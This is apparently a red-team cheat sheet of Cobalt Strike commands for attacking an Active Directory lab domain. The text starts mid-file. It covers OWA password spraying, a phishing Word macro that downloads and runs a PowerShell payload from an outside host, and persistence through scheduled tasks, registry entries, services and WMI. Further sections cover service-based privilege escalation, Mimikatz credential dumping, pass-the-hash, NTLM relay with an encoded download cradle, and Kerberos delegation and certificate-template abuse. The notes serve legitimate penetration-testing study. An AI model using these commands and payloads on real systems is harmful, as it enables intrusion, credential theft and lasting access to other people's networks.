#Send whoami query to root dc domain of the forest
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-dc.dollarcorp.moneycorp.local


```

### Initial Compromise

- Enumerating OWA to identify valid user and conducting password spraying attack

```powershell
# Identify the mail server of given domain
$ dig cyberbotic.io
$ ./dnscan.py -d cyberbotic.io -w subdomains-100.txt

# Idenitfy the NETBIOS name of target domain
ps> ipmo C:\Tools\MailSniper\MailSniper.ps1
ps> Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io

# Extract Employee Names (FirstName LastName) and Prepare Username List
$ ~/namemash.py names.txt > possible.txt

# Validate the username to find active/real usernames
ps> Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt

# Conduct Password Spraying attack with known Password on identified users
ps> Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022

# Use Identified credentials to download Global Address List
ps> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
```

- Create a malicious Office file having embedded macro

```
# Step 1: Open a blank word document "Document1". Navigate to  View > Macros > Create. Changes macros in to Document1. Name the default macro function as AutoOpen. Paste the below content and run for testing

Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "notepad"

End Sub

# Step 2: Generate a payload for web delivery (Attacks > Scripted Web Delivery (S) and generate a 64-bit PowerShell payload with your HTTP/DNS listener). Balance the number of quotes

Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
	Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""

End Sub

# Step 3: Save the document as .doc file and send it as phising email

```

### Host Reconnaissance

```powershell
# Identify running process like AV, EDR or any monitoring and logging solution
beacon> ps

# Use Seatbealt to enumerate about system
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system

# Screenshot, Clipboard, Keylogger and User Sessions of currently logged in user
beacon> screenshot
beacon> clipboard
beacon> net logons

beacon> keylogger
beacon> job
beacon> jobkill 3
```

### Host Persistence (Normal + Privilleged)

```powershell

# Default location for powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell

# Encode the payload for handling extra quotes 

# Powershell
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

#Linux 
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0

# Final Command
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>

# Common userland persistence methods include HKCU / HKLM Registry Autoruns, Scheduled Tasks, Startup Folder

# Persistance - Task Scheduler
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoAC...GEAIgApACkA" -n "Updater" -m add -o hourly

# Persistance - Startup Folder
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAo..vAGEAIgApACkA" -f "UserEnvSetup" -m add

# Persistance - Registry Autorun
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

# Persistance COM Hijacks

# Persistance - Privilleged System User

# Windows Service
beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe legit-svc.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add

# Register WMI event to trigger our payload
beacon> cd C:\Windows
beacon> upload C:\Payloads\dns_x64.exe
beacon> powershell-import C:\Tools\PowerLurk.ps1
beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe

```

### Privilege Escalation

```powershell
# Query and Manage all the installed services
beacon> powershell Get-Service | fl
beacon> run wmic service get name, pathname
beacon> run sc query
beacon> run sc qc VulnService2
beacon> run sc stop VulnService1
beacon> run sc start VulnService1

# Use SharpUp to find exploitable services
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit 

# CASE 1: Unquoted Service Path (Hijack the service binary search logic to execute our payload)
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
beacon> cd C:\Program Files\Vulnerable Services
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe Service.exe
beacon> run sc stop VulnService1
beacon> run sc start VulnService1
beacon> connect localhost 4444

# CASE 2: Weak Service Permission (Possible to modify service configuration)
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1
beacon> powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
beacon> run sc qc VulnService2
beacon> mkdir C:\Temp
beacon> cd C:\Temp
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
beacon> run sc qc VulnService2
beacon> run sc stop VulnService2
beacon> run sc start VulnService2
beacon> connect localhost 4444

# CASE 3: Weak Service Binary Permission (Overwite the service binary due to weak permission)
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
PS C:\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"
beacon> run sc stop VulnService3
beacon> cd "C:\Program Files\Vulnerable Services"
beacon> upload C:\Payloads\Service 3.exe
beacon> run sc start VulnService3
beacon> connect localhost 4444

# UAC Bypass
beacon> run whoami /groups
beacon> elevate uac-schtasks tcp-local
beacon> run netstat -anop tcp
beacon> connect localhost 4444
```

### Credential Theft

```powershell
# "!" symbol is used to run command in elevated context of System User
# "@" symbol is used to impersonate beacon thread token

# Dump the local SAM database 
beacon> mimikatz !lsadump::sam

# Dump the logon passwords (Plain Text + Hashes) from LSASS.exe for currently logged on users
beacon> mimikatz !sekurlsa::logonpasswords

# Dump the encryption keys used by Kerberos of logged on users (hashes incorrectly labelled as des_cbc_md4)
beacon> mimikatz !sekurlsa::ekeys

# Dump Domain Cached Credentials (cannotbe be used for lateral movement unless cracked)
beacon> mimikatz !lsadump::cache

# List the kerberos tickets cached in current logon session or all logon session (privileged session)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# Dump the TGT Ticket from given Logon Session (LUID)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt

# DC Sync
beacon> make_token DEV\nlamb F3rrari
beacon> dcsync dev.cyberbotic.io DEV\krbtgt

# Dump krbtgt hash from DC (locally)
beacon> mimikatz !lsadump::lsa /inject /name:krbtgt
```

### Domain Recon

- Domain Recon using Power View

```powershell
# Use PowerView for domain enumeration
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

# Get Domain Information
beacon> powerpick Get-Domain -Domain <>

# Get Domain SID
beacon> powerpick Get-DomainSID

# Get Domain Controller
beacon> powerpick Get-DomainController | select Forest, Name, OSVersion | fl

# Get Forest Information
beacon> powerpick Get-ForestDomain -Forest <>

# Get Domain Policy 
beacon> powerpick Get-DomainPolicyData | select -expand SystemAccess

# Get Domain users
beacon> powerpick Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl

# Identify Kerberoastable/ASEPRoastable User/Uncontrained Delegation
beacon> powerpick Get-DomainUser | select cn,serviceprincipalname
beacon> powerpick Get-DomainUser -PreauthNotRequired
beacon> powerpick Get-DomainUser -TrustedToAuth

# Get Domain Computer
beacon> powerpick Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName

# Idenitify Computer Accounts where unconstrained and constrained delefation is enabled
beacon> powerpick Get-DomainComputer -Unconstrained | select cn, dnshostname
beacon> powerpick Get-DomainComputer -TrustedToAuth | select cn, msdsallowedtodelegateto

# Get Domain OU
beacon> powerpick Get-DomainOU -Properties Name | sort -Property Name

# Identify computers in given OU
beacon> powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

# Get Domain group (Use -Recurse Flag)
beacon> powerpick Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName

# Get Domain Group Member
beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberDistinguishedName

# Get Domain GPO
beacon> powerpick Get-DomainGPO -Properties DisplayName | sort -Property DisplayName

# Find the System where given GPO are applicable
beacon> powerpick Get-DomainOU -GPLink "{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}" | select distinguishedName

# Idenitfy domain users/group who have local admin via Restricted group or GPO 
beacon> powerpick Get-DomainGPOLocalGroup | select GPODisplayName, GroupName

# Enumerates the machines where a specific domain user/group has local admin rights
beacon> powerpick Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl

# Get Domain Trusts
beacon> powerpick Get-DomainTrust

# Find Local Admin Access on other domain computers based on context of current user
beacon> powerpick Find-LocalAdminAccess
beacon> powerpick Invoke-CheckLocalAdminAccess -ComputerName <server_fqdn>

beacon> powerpick Invoke-UserHunter
beacon> powerpick Find-PSRemotingLocalAdminAccess -ComputerName <server_fqdn>
beacon> powerpick Find-WMILocalAdminAccess -ComputerName <server_fqdn>

```

- Domain recon using SharpView binary

```powershell
beacon> execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain

```

- Domain recon using ADSearch

```powershell

beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user"

beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins*))"

beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member

# Kerberostable Users
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

# ASEPROAST
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

# Unconstrained Delegation
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

# Constrained Delegation
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

# Additionally, the `--json` parameter can be used to format the output in JSON
```

### User Impersonation

- Pass The Hash Attack

```powershell
beacon> getuid
beacon> ls \\web.dev.cyberbotic.io\c$

# PTH using inbuild method in CS (internally uses Mimikatz)
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c

# Find Local Admin Access
beacon> powerpick Find-LocalAdminAccess

beacon> rev2self
```

- Pass The Ticket Attack

```powershell
# Create a sacrificial token with dummy credentials
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123

# Inject the TGT ticket into logon session returned as output of previous command
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP

# OR Combine above 2 steps in one
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123 /ticket:doIFuj[...snip...]lDLklP 

beacon> steal_token 4748
```

- OverPass The Hash

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap

# Use aes256 hash for better opsec, along with /domain and /opsec flags (better opsec)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
```

- Token Impersonation & Proces Injection

```powershell
beacon> steal_token 4464
beacon> inject 4464 x64 tcp-local
beacon> shinject /path/to/binary
```

### Lateral Movement

```powershell
# using Jump
beacon> jump psexec/psexec64/psexec_psh/winrm/winrm64 ComputerName beacon_listener

# Using remote exec
beacon> remote-exec psexec/winrm/wmi ComputerName <uploaded binary on remote system>

# Example Windows Management Instrumentation (WMI)
beacon> cd \\web.dev.cyberbotic.io\ADMIN$
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10

# Executing .Net binary remotely 
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web

# Invoke DCOM (better opsec)
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
beacon> link web.dev.cyberbotic.io agent_vinod

NOTE: While using remote-exec for lateral movement, kindly generate the windows service binary as psexec creates a windows service pointing to uploaded binary for execution 
```

### Session Passing

```powershell
# CASE 1: Beacon Passing (Within Cobalt Strike - Create alternate HTTP beacon while keeping DNS as lifeline)
beacon> spawn x64 http

# CASE 2: Foreign Listener (From CS to Metasploit - Staged Payload - only x86 payloads)

# Setup Metasploit listener
attacker@ubuntu ~> sudo msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST ens5
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run

# Setup a Foreign Listener in cobalt strike with above IP & port details

# Use Jump psexec to execute the beacon payload and pass the session
beacon> jump psexec Foreign_listener

# CASE 3: Shellcode Injection (From CS to Metasploit - Stageless Payload)

# Setup up metasploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_http
msf6 exploit(multi/handler) > exploit

# Generate binary
ubuntu@DESKTOP-3BSK7NO ~> msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.50 LPORT=8080 -f raw -o /mnt/c/Payloads/msf_http_x64.bin

# Inject msf shellcode into process memory
beacon> shspawn x64 C:\Payloads\msf_http_x64.bin

```

### Pivoting

```powershell
# Enable Socks Proxy in beacon session (Use SOCKS 5 for better OPSEC)
beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

# Verify the SOCKS proxy on team server
attacker@ubuntu ~> sudo ss -lpnt

# Configure Proxychains in Linux
$ sudo vim /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password

$attacker@ubuntu ~> proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10
ubuntu@DESKTOP-3BSK7NO ~ > proxychains wmiexec.py DEV/jking@10.10.122.30

# Use Proxifier for Windows environment 
ps> runas /netonly /user:dev/bfarmer mmc.exe
ps> mimikatz # privilege::debug
ps> mimikatz # sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe
PS C:\Users\Attacker> $cred = Get-Credential
PS C:\Users\Attacker> Get-ADComputer -Server 10.10.122.10 -Filter * -Credential $cred | select

# Use FoxyProxy plugin to access Webportal via SOCKS Proxy

# Reverse Port Forward (if teamserver is not directly accessible, then use rportfwd to redirect traffic)
beacon> rportfwd 8080 127.0.0.1 80
beacon> run netstat -anp tcp
ps> iwr -Uri http://wkstn-2:8080/a

beacon> powershell New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
beacon> powershell Remove-NetFirewallRule -DisplayName "Test Rule"

# NTLM Relay

1. Setup SOCKS Proxy on the beacon
beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

2. Setup Proxychains to use this proxy
$ sudo vim /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password

3. Use Proxychain to send NTLMRelay traffic to beacon targeting DC and encoded SMB Payload for execution
$ sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA='

# iex (new-object net.webclient).downloadstring("http://10.10.123.102:8080/b")

4. Setup reverse port forwarding 
beacon> rportfwd 8080 127.0.0.1 80
beacon> rportfwd 8445 127.0.0.1 445

5. Upload PortBender driver and load its .cna file
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
beacon> PortBender redirect 445 8445

6. Manually try to access share on our system or use MSPRN, Printspooler to force authentication

7. Verify the access in weblog and use link command to connect with SMB beacon
beacon> link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10

```

### Data Protection API

```powershell
# Use mimikatz to dump secrets from windows vault
beacon> mimikatz !vault::list
beacon> mimikatz !vault::cred /patch

# Part 1: Enumerate stored credentials

0. Check if system has credentials stored in either web or windows vault
beacon> run vaultcmd /list
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
beacon> run vaultcmd /listcreds:"Web Credentials" /all
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

# Part 2.1: Scheduled Task Credentials

1. Credentials for task scheduler are stored at below location in encrypted blob
beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

2. Find the GUID of Master key associated with encrypted blob (F31...B6E)
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E

3. Dump all the master keys and filter the one we need based on GUID identified in previous step
beacon> mimikatz !sekurlsa::dpapi

4. Use the Encrypted Blob and Master Key to decrypt and extract plain text password
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9

# Part 2.2: Extracting stored RDP Password 

1. Enumerate the location of encrypted credentials blob (Returns ID of Enc blob and GUID of Master Key)
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles

2. Verify the credential blob in users cred directory (Note enc blob ID)
beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials

3. Master key is stored in users Protect directory (Note GUID of master key matching with Seatbelt)
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104

4. Decrypt the master key (Need to be execute in context of user who owns the key, use @ modifier)
beacon> mimikatz !sekurlsa::dpapi
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc

5. Use Master key to decrypt the credentials blob
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214

```

### Kerberos

1. First find all the SPN accounts
2. Select SPN of a domain admin since we doing privilege escalation
3. Set the SPN as the argumentlist value and create a new object ( request a TGS )
4. Export the all the tickets by mimikatz
5. Keep a note of the file name where the ticket is stored of that service
6. Crack the ticket



```powershell

# Kerberosting
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

ps> hashcat -a 0 -m 13100 hashes wordlist

# ASREPRoast
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap

ps> hashcat -a 0 -m 18200 svc_oracle wordlist

# Unconstrained Delegation (Caches TGT of any user accessing its service)

1. Identify the computer objects having Unconstrained Delegation enabled
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

2. Dumping the cached TGT ticket (requires system access on affected system)
beacon> getuid
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap

3. Execute PrintSpool attack to force DC to authenticate with WEB 
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io

4. Use Machine TGT (DC) fetched to gain RCE on itself using S4U abuse (/self flag)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

5. Inject the ticket and access the service
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

beacon> steal_token 2664
beacon> ls \\dc-2.dev.cyberbotic.io\c$

# Constrained Delegation (allows to request TGS for any user using its TGT)

1. Identify the computer objects having Constrained Delegation is enabled
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

2. Dump the TGT of User/Computer Account having constrained Delegation enabled (use asktgt if NTLM hash)
beacon> getuid
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

3. Use S4U technique to request TGS for delegated service using machines TGT (Use S4U2Proxy tkt)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap

4. OR, Access other alternate Service not stated in Delegation attribute (ldap)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap

5. Inject the S4U2Proxy tkt from previous step
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv

6. Access the services 
beacon> steal_token 5540
beacon> ls \\dc-2.dev.cyberbotic.io\c$
beacon> dcsync dev.cyberbotic.io DEV\krbtgt

# Resource-Based Constrained Delegation (Systems having writable msDS-AllowedToActOnBehalfOfOtherIdentity)

1. Identify the Computer Objects which has AllowedToActOnBehalfOfOtherIdentity attribute defined
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" --attributes dnshostname,samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity --json

2. OR, Identify the Domain Computer where we can write this atribute with custom value 
beacon> powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

3. Next we will assign delegation rights to our computer by modifying the attribute of target system
beacon> powerpick Get-DomainComputer -Identity wkstn-2 -Properties objectSid
beacon> powerpick $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

4. Verify the updated attribute
beacon> powerpick Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

5. Get the TGT of our computer
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

6. Use S4U technique to get TGS for target computer using our TGT
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap

7. Access the services
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=

beacon> steal_token 4092
beacon> ls \\dc-2.dev.cyberbotic.io\c$

8 Remove the delegation rights
beacon> powerpick Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity

OR, Create Fake computer Account for RBCD Attack

9. Check if we have permission to create computer account (default allowed)
beacon> powerpick Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota

10. Create a fake computer with random password (generate hash using Rubeus)
beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
PS> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io

11. Use the Hash to get TGT for our fake computer, and rest of the steps remains same
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap

```

### Active Directory Certificate Services

```powershell
# Finding Certificate Authorities
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas

# Miconfigured Certificate template
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable

# Attack Case 1: _ENROLLEE_SUPPLIES_SUBJECT_

beacon> getuid
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb

